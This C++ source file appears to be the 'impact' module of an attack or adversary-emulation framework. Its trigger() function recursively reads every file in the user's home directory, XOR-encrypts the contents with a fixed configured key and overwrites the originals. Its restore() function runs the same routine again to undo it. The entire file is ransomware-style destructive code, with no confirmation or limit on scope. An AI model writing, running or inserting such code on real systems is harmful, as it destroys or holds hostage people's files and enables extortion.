#include "modules/impact/Encryption.hpp"
#include "utils/Logger.hpp"
#include "utils/CryptoUtils.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "core/Config.hpp"

bool EncryptionMethod::trigger() {
    std::string targetDir = SystemUtils::GetUserHome();
    LOG_INFO("Encrypting files in {}", targetDir)

    auto files = FileUtils::ListFilesRecursively(targetDir);
    int successCount = 0;

    for (const auto& filePath : files) {
        try {
            std::string content = FileUtils::ReadFile(filePath);
            if (content.empty()) continue;

            std::string encrypted = CryptoUtils::XorEncrypt(content, Config::ENCRYPTION_KEY);

            if (FileUtils::WriteFile(filePath, encrypted)) {
                LOG_INFO("Encrypted {}", filePath)
                successCount++;
            }
        } catch (const std::exception& e) {
            LOG_ERROR("Failed to encrypt {}", filePath, e.what())
        }
    }
    LOG_SUCCESS("Encryption summary: encrypted {} files", successCount)

    return true;
}

bool EncryptionMethod::restore() {
    return trigger();
}
